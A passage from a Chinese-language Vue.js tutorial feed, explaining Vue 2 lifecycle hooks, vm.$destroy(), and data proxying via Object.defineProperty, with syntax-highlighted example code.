</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="nt">button</span> <span class="err">@</span><span class="na">click</span><span class="o">=</span><span class="s">&#34;bye&#34;</span><span class="p">&gt;</span>销毁Vue实例<span class="p">&lt;/</span><span class="nt">button</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">script</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;text/javascript&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="k">new</span> <span class="nx">Vue</span><span class="p">({</span>
</span></span><span class="line"><span class="cl">    <span class="nx">el</span><span class="o">:</span> <span class="s2">&#34;#app&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="nx">data</span><span class="o">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="nx">num</span><span class="o">:</span> <span class="mi">1</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="p">},</span>
</span></span><span class="line"><span class="cl">    <span class="nx">methods</span><span class="o">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="nx">add</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;add.&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="k">this</span><span class="p">.</span><span class="nx">num</span><span class="o">++</span>
</span></span><span class="line"><span class="cl">      <span class="p">},</span>
</span></span><span class="line"><span class="cl">      <span class="nx">bye</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;Bye.&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="cm">/**
</span></span></span><span class="line"><span class="cl"><span class="cm">         * vm.$destroy()：
</span></span></span><span class="line"><span class="cl"><span class="cm">         * 销毁vm，清理它与其它实例的连接，解绑全部指令及事件监听器（自定义事件）
</span></span></span><span class="line"><span class="cl"><span class="cm">         * 但是在销毁之前vm对页面所作的改变，在销毁之后依旧呈现在页面中
</span></span></span><span class="line"><span class="cl"><span class="cm">         * 销毁了vm之后仅仅意味着没有vm来管理页面的修改了
</span></span></span><span class="line"><span class="cl"><span class="cm">         * 在某些Vue版本（如 2.6.12）中，销毁了vm后事件绑定的函数依然可以被调用
</span></span></span><span class="line"><span class="cl"><span class="cm">         */</span>
</span></span><span class="line"><span class="cl">        <span class="k">this</span><span class="p">.</span><span class="nx">$destroy</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">      <span class="p">},</span>
</span></span><span class="line"><span class="cl">    <span class="p">},</span>
</span></span><span class="line"><span class="cl">    <span class="nx">watch</span><span class="o">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="nx">num</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;The [num] was updated.&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">      <span class="p">},</span>
</span></span><span class="line"><span class="cl">    <span class="p">},</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="cm">/**
</span></span></span><span class="line"><span class="cl"><span class="cm">     * 生命周期和事件初始化完成
</span></span></span><span class="line"><span class="cl"><span class="cm">     */</span>
</span></span><span class="line"><span class="cl">    <span class="nx">beforeCreate</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;beforeCreate.&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">      <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="k">this</span><span class="p">);</span>  <span class="c1">// Vue 实例中还没有 _data
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>      <span class="kr">debugger</span>  <span class="c1">// 断点
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="p">},</span>
</span></span><span class="line"><span class="cl">    <span class="cm">/**
</span></span></span><span class="line"><span class="cl"><span class="cm">     * 数据监测和数据代理初始化完成
</span></span></span><span class="line"><span class="cl"><span class="cm">     */</span>
</span></span><span class="line"><span class="cl">    <span class="nx">created</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;created.&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">      <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="k">this</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">      <span class="kr">debugger</span>
</span></span><span class="line"><span class="cl">    <span class="p">},</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="cm">/**
</span></span></span><span class="line"><span class="cl"><span class="cm">     * 模板解析完成，已生成虚拟DOM
</span></span></span><span class="line"><span class="cl"><span class="cm">     */</span>
</span></span><span class="line"><span class="cl">    <span class="nx">beforeMount</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;beforeMount.&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">      <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="k">this</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">      <span class="nb">document</span><span class="p">.</span><span class="nx">getElementsByName</span><span class="p">(</span><span class="s1">&#39;h2&#39;</span><span class="p">)[</span><span class="mi">0</span><span class="p">].</span><span class="nx">innerText</span><span class="p">(</span><span class="s1">&#39;Hello&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">      <span class="kr">debugger</span>
</span></span><span class="line"><span class="cl">    <span class="p">},</span>
</span></span><span class="line"><span class="cl">    <span class="cm">/**
</span></span></span><span class="line"><span class="cl"><span class="cm">     * 虚拟DOM已经转为真实DOM插入页面
</span></span></span><span class="line"><span class="cl"><span class="cm">     */</span>
</span></span><span class="line"><span class="cl">    <span class="nx">mounted</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;mounted.&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">      <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="k">this</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">      <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="nx">$el</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">      <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="nx">$el</span> <span class="k">instanceof</span> <span class="nx">HTMLElement</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">      <span class="kr">debugger</span>
</span></span><span class="line"><span class="cl">    <span class="p">},</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="cm">/**
</span></span></span><span class="line"><span class="cl"><span class="cm">     * data 更新后重新编译页面之前
</span></span></span><span class="line"><span class="cl"><span class="cm">     */</span>
</span></span><span class="line"><span class="cl">    <span class="nx">beforeUpdate</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;beforeUpdate.&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">      <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="nx">num</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">      <span class="kr">debugger</span>
</span></span><span class="line"><span class="cl">    <span class="p">},</span>
</span></span><span class="line"><span class="cl">    <span class="cm">/**
</span></span></span><span class="line"><span class="cl"><span class="cm">     * data 更新之后页面已经编译完成
</span></span></span><span class="line"><span class="cl"><span class="cm">     */</span>
</span></span><span class="line"><span class="cl">    <span class="nx">updated</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;updated.&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">      <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="nx">num</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">      <span class="kr">debugger</span>
</span></span><span class="line"><span class="cl">    <span class="p">},</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="cm">/**
</span></span></span><span class="line"><span class="cl"><span class="cm">     * vm被销毁之前
</span></span></span><span class="line"><span class="cl"><span class="cm">     */</span>
</span></span><span class="line"><span class="cl">    <span class="nx">beforeDestroy</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;beforeDestroy.&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">      <span class="k">this</span><span class="p">.</span><span class="nx">add</span><span class="p">()</span>  <span class="c1">// 此时已经不能对页面做出更改了
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>      <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="nx">num</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">      <span class="kr">debugger</span>
</span></span><span class="line"><span class="cl">    <span class="p">},</span>
</span></span><span class="line"><span class="cl">    <span class="cm">/**
</span></span></span><span class="line"><span class="cl"><span class="cm">     * vm已经被销毁
</span></span></span><span class="line"><span class="cl"><span class="cm">     */</span>
</span></span><span class="line"><span class="cl">    <span class="nx">destroyed</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;destroyed.&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">},</span>
</span></span><span class="line"><span class="cl">  <span class="p">});</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
</span></span></code></pre></div><p>可以看出在Vue的生命周期过程中共有8个（4对）钩子函数。</p>
<hr>
<h1 id="创建流程" data-numberify>创建流程<a class="anchor ms-1" href="#创建流程"></a></h1>
<ol>
<li>
<p><code>beforeCreate()</code>：生命周期和事件初始化完成时执行。</p>
<p>数据代理和数据监测还未开始。</p>
</li>
<li>
<p><code>created()</code>：数据监测和数据代理初始化完成时执行。</p>
</li>
</ol>
<p>创建指的是数据代理和数据监测被创建。</p>
<blockquote>
<p>注：在<code>watch</code>中，配置了<code>immediate:true</code>的<code>watch</code>是在Init Reactivity阶段（也就是Init Options API中）第1次执行<code>handler()</code>方法。</p>
<p>也就是说，配置了<u><code>immediate:true</code>的<code>watch</code></u>，其<code>handler()</code>会<u>在<code>beforeCreate()</code>之后<code>created()</code>之前进行第1次执行</u>。</p>
</blockquote>
<hr>
<h1 id="挂载流程" data-numberify>挂载流程<a class="anchor ms-1" href="#挂载流程"></a></h1>
<ol>
<li>
<p><code>beforeMount()</code>：模板解析完成。</p>
<p>此时已生成虚拟DOM，但页面还未经过编译，展示的是模板的原内容。在此对DOM的操作，最终都不奏效</p>
</li>
<li>
<p><code>mounted()</code>：虚拟DOM已经转为真实DOM插入页面时执行。</p>
<p>此时页面中呈现的是已经Vue编译过的DOM，对DOM的操作有效（使用Vue的过程尽可能避免操作DOM）。</p>
<p>一般在此时进行如下等初始化操作：</p>
<ul>
<li>开启定时器</li>
<li>发送网络请求</li>
<li>订阅消息</li>
<li>绑定自定义事件</li>
</ul>
</li>
</ol>
<hr>
<h1 id="数据更新流程" data-numberify>数据更新流程<a class="anchor ms-1" href="#数据更新流程"></a></h1>
<ol>
<li>
<p><code>beforeUpdate()</code>：数据更新后重新编译页面之前执行。</p>
<p>数据是修改之后的，但页面还未重新编译，仍是旧的（更新之前的内容）。</p>
</li>
<li>
<p><code>updated()</code>：数据更新之后执行。</p>
<p>此时页面已经编译完成。数据在更新之后，页面已经完成了编译，与数据同步。此时已经完成了<code>Model =&gt; View</code>的更新。</p>
</li>
</ol>
<hr>
<h1 id="销毁流程" data-numberify>销毁流程<a class="anchor ms-1" href="#销毁流程"></a></h1>
<ol>
<li>
<p><code>beforeDestory()</code>：<code>vm</code>被销毁之前（还未销毁）执行。</p>
<p>此时<code>vm</code>中所有的<code>data</code>、<code>methods</code>、指令等等都处于可用状态。</p>
<p>一般在此阶段执行如下等收尾操作：</p>
<ul>
<li>关闭定时器</li>
<li>取消订阅消息</li>
<li>解绑自定义事件</li>
</ul>
<p>此时所有对数据的修改不会再触发更新（不能再对页面做出更改）。</p>
</li>
<li>
<p><code>destroyed()</code>：<code>vm</code>被销毁之后（销毁完毕）执行。</p>
<p>此时<code>vm</code>中所有的监听器、子组件和（自定义）事件监听器被移除。</p>
<blockquote>
<p>一般很少在这个钩子里做处理。</p>
</blockquote>
</li>
</ol>
<p>销毁与<code>vm.$destroy()</code>相关。只有对<code>vm</code>（Vue实例）调用<code>vm.$destroy()</code>后，<code>vm</code>才会开始进行销毁流程。</p>
<p><code>vm.$destroy()</code>：</p>
<ul>
<li>销毁<code>vm</code>，清理它与其它实例的连接，解绑全部指令及事件监听器（自定义事件）。</li>
<li>在销毁之前（调用<code>vm.$destroy()</code>之前），<code>vm</code>对页面所作的改变，在销毁之后依旧呈现在页面中。</li>
<li>销毁了<code>vm</code>之后仅仅意味着没有<code>vm</code>来管理页面的修改了。</li>
<li>在某些Vue版本（如 2.6.12）中，销毁了<code>vm</code>后事件绑定的函数依然可以被调用。即原生DOM事件依然有效。</li>
</ul>
<blockquote>
<p>在大多数场景中，不应该调用<code>vm.$destroy()</code>。最好使用<code>v-if</code>和<code>v-for</code>指令，以数据驱动的方式控制子组件的生命周期。</p>
</blockquote>
]]></content:encoded>
    </item>
    
    <item>
      <title>Vue 数据代理与监听</title>
      <link>/docs/vue/single-instance/data-proxy-watch/</link>
      <pubDate>Tue, 12 Sep 2023 05:03:31 +0000</pubDate>
      
      <guid>/docs/vue/single-instance/data-proxy-watch/</guid>
      <description><![CDATA[数据代理是指通过一个对象代理另一个对象中属性的（读/写）操作。 数据代理的原理 数据代理可以通过Object.defineProperty()实]]></description>
      <content:encoded><![CDATA[<p>数据代理是指通过一个对象代理另一个对象中属性的（读/写）操作。</p>
<h1 id="数据代理的原理" data-numberify>数据代理的原理<a class="anchor ms-1" href="#数据代理的原理"></a></h1>
<p>数据代理可以通过<code>Object.defineProperty()</code>实现。在Vue中，很多技术的实现都使用到了<code>Object.defineProperty()</code>这个方法。</p>
<p><code>Object.defineProperty()</code>的用法如下所示：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="kd">let</span> <span class="nx">person</span> <span class="o">=</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="nx">name</span><span class="o">:</span> <span class="s1">&#39;张三&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">  <span class="nx">sex</span><span class="o">:</span> <span class="s1">&#39;男&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">  <span class="c1">// age: 18,
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="cm">/**
</span></span></span><span class="line"><span class="cl"><span class="cm"> * 使用 Object.defineProperty() 给对象添加属性
</span></span></span><span class="line"><span class="cl"><span class="cm"> * 1. 参数1：要添加属性的对象
</span></span></span><span class="line"><span class="cl"><span class="cm"> * 2. 参数2：要给对象添加的属性名称
</span></span></span><span class="line"><span class="cl"><span class="cm"> * 3. 参数3：要添加的属性的配置
</span></span></span><span class="line"><span class="cl"><span class="cm"> */</span>
</span></span><span class="line"><span class="cl"><span class="nb">Object</span><span class="p">.</span><span class="nx">defineProperty</span><span class="p">(</span><span class="nx">person</span><span class="p">,</span> <span class="s1">&#39;age&#39;</span><span class="p">,</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="nx">value</span><span class="o">:</span> <span class="mi">18</span><span class="p">,</span>  <span class="c1">// 定义属性的值
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="nx">enumerable</span><span class="o">:</span> <span class="kc">true</span><span class="p">,</span> <span class="c1">// 控制属性是否可枚举，默认为false
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="nx">writable</span><span class="o">:</span> <span class="kc">true</span><span class="p">,</span> <span class="c1">// 控制属性是否可被写入（修改），默认为false
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="nx">configurable</span><span class="o">:</span> <span class="kc">true</span><span class="p">,</span> <span class="c1">// 控制属性是否可被删除，默认为false
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="p">})</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">person</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="c1">// console.log(Object.keys(person));
</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="kd">let</span> <span class="nx">articleSize</span> <span class="o">=</span> <span class="mi">100</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">let</span> <span class="nx">article</span> <span class="o">=</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="nx">name</span><span class="o">:</span> <span class="s1">&#39;Vue&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">  <span class="c1">// size: articleSize,
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nb">Object</span><span class="p">.</span><span class="nx">defineProperty</span><span class="p">(</span><span class="nx">article</span><span class="p">,</span> <span class="s1">&#39;size&#39;</span><span class="p">,</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="cm">/**
</span></span></span><span class="line"><span class="cl"><span class="cm">   * Getter：
</span></span></span><span class="line"><span class="cl"><span class="cm">   * 当article.size被读取时，get()会被调用，并且将返回值作为article.size的值
</span></span></span><span class="line"><span class="cl"><span class="cm">   */</span>
</span></span><span class="line"><span class="cl">  <span class="nx">get</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;The article.size is read.&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nx">articleSize</span>
</span></span><span class="line"><span class="cl">  <span class="p">},</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="cm">/**
</span></span></span><span class="line"><span class="cl"><span class="cm">   * Setter：
</span></span></span><span class="line"><span class="cl"><span class="cm">   * 当article.size被修改时，set()会被调用，并且将参数value作为article.size的值
</span></span></span><span class="line"><span class="cl"><span class="cm">   */</span>
</span></span><span class="line"><span class="cl">  <span class="nx">set</span><span class="p">(</span><span class="nx">value</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="sb">`The article.size is modified to </span><span class="si">${</span><span class="nx">value</span><span class="si">}</span><span class="sb">.`</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nx">articleSize</span> <span class="o">=</span> <span class="nx">value</span>
</span></span><span class="line"><span class="cl">  <span class="p">},</span>
</span></span><span class="line"><span class="cl"><span class="p">})</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">article</span><span class="p">);</span>
</span></span></code></pre></div><p>假设有两个对象<code>obj1</code>和<code>obj2</code>，需要能通过<code>obj2</code>来修改<code>obj1</code>，可以这样实现：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="kd">let</span> <span class="nx">obj1</span> <span class="o">=</span> <span class="p">{</span><span class="nx">x</span><span class="o">:</span> <span class="mi">100</span><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="kd">let</span> <span class="nx">obj2</span> <span class="o">=</span> <span class="p">{</span><span class="nx">y</span><span class="o">:</span> <span class="mi">200</span><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nb">Object</span><span class="p">.</span><span class="nx">defineProperty</span><span class="p">(</span><span class="nx">obj2</span><span class="p">,</span> <span class="s1">&#39;x&#39;</span><span class="p">,</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="nx">get</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nx">obj1</span><span class="p">.</span><span class="nx">x</span>
</span></span><span class="line"><span class="cl">  <span class="p">},</span>
</span></span><span class="line"><span class="cl">  <span class="nx">set</span><span class="p">(</span><span class="nx">value</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nx">obj1</span><span class="p">.</span><span class="nx">x</span> <span class="o">=</span> <span class="nx">value</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">})</span>
</span></span></code></pre></div><hr>
<h1 id="vue-数据代理" data-numberify>Vue 数据代理<a class="anchor ms-1" href="#vue-数据代理"></a></h1>
<p>Vue实例实际上是Vue实例中的<code>data</code>的数据代理对象。Vue实例中的<code>data</code>通过数据代理，将其对象中的属性交予Vue实例来直接管理。</p>
<p>验证Vue数据代理：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="cp">&lt;!DOCTYPE html&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">html</span> <span class="na">lang</span><span class="o">=</span><span class="s">&#34;en&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">head</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="nt">meta</span> <span class="na">charset</span><span class="o">=</span><span class="s">&#34;UTF-8&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="nt">meta</span> <span class="na">name</span><span class="o">=</span><span class="s">&#34;viewport&#34;</span> <span class="na">content</span><span class="o">=</span><span class="s">&#34;width=device-width, initial-scale=1.0&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="nt">script</span> <span class="na">src</span><span class="o">=</span><span class="s">&#34;https://cdn.jsdelivr.net/npm/vue@2.7.14/dist/vue.js&#34;</span><span class="p">&gt;&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="nt">title</span><span class="p">&gt;</span>数据代理<span class="p">&lt;/</span><span class="nt">title</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">head</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">body</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="nt">div</span> <span class="na">id</span><span class="o">=</span><span class="s">&#34;app&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">h1</span><span class="p">&gt;</span>姓名：{{name}}<span class="p">&lt;/</span><span class="nt">h1</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">h1</span><span class="p">&gt;</span>年龄：{{age}}<span class="p">&lt;/</span><span class="nt">h1</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="nt">script</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;text/javascript&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="kr">const</span> <span class="nx">data</span> <span class="o">=</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="nx">name</span><span class="o">:</span> <span class="s1">&#39;张三&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">      <span class="nx">age</span><span class="o">:</span> <span class="s1">&#39;18&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="kr">const</span> <span class="nx">vm</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Vue</span><span class="p">({</span>
</span></span><span class="line"><span class="cl">      <span class="nx">el</span><span class="o">:</span> <span class="s2">&#34;#app&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">      <span class="nx">data</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="p">});</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">data</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">vm</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="sb">`vm._data === data ??? </span><span class="si">${</span><span class="nx">vm</span><span class="p">.</span><span class="nx">_data</span> <span class="o">===</span> <span class="nx">data</span><span class="si">}</span><span class="sb">`</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">body</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">html</span><span class="p">&gt;</span>
</span></span></code></pre></div><p>实际上，Vue对象在实例化时，会将配置（<code>options</code>）中的<code>data</code>实例化为<code>vm._data</code>。所以实际上<code>vm</code>对象代理的是<code>vm._data</code>对象。</p>
<p>由于Vue模板语法中，在使用插值时获取的是Vue实例中的对象。如果Vue没有使用数据代理，那么要获取<code>data</code>中的数据，相应的表达式应该写作<code>{{_data.name}}</code>（假设获取<code>name</code>）。当使用了数据代理，<code>data</code>中的对象可以通过Vue实例对象来进行操作，那么表达式就可以直接写作<code>{{name}}</code>。</p>
<hr>
<h1 id="vue-计算属性" data-numberify>Vue 计算属性<a class="anchor ms-1" href="#vue-计算属性"></a></h1>
<p>Vue.js计算属性在处理一些复杂逻辑时是很有用的。</p>
<p>计算属性的关键词是<code>computed</code>，在Vue实例的配置中指定<code>computed</code>即可定义计算属性。</p>
<p>Vue计算属性示例如下：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">div</span> <span class="na">id</span><span class="o">=</span><span class="s">&#34;app&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  姓：<span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;text&#34;</span> <span class="na">v-model</span><span class="o">=</span><span class="s">&#34;firstName&#34;</span><span class="p">&gt;&lt;</span><span class="nt">br</span><span class="p">&gt;&lt;</span><span class="nt">br</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  名：<span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;text&#34;</span> <span class="na">v-model</span><span class="o">=</span><span class="s">&#34;lastName&#34;</span><span class="p">&gt;&lt;</span><span class="nt">br</span><span class="p">&gt;&lt;</span><span class="nt">br</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  姓名：<span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;text&#34;</span> <span class="na">v-model</span><span class="o">=</span><span class="s">&#34;fullName&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">script</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;text/javascript&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="k">new</span> <span class="nx">Vue</span><span class="p">({</span>
</span></span><span class="line"><span class="cl">    <span class="nx">el</span><span class="o">:</span> <span class="s2">&#34;#app&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="nx">data</span><span class="o">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="nx">firstName</span><span class="o">:</span> <span class="s1">&#39;张&#39;</span><span class="p">,</span>
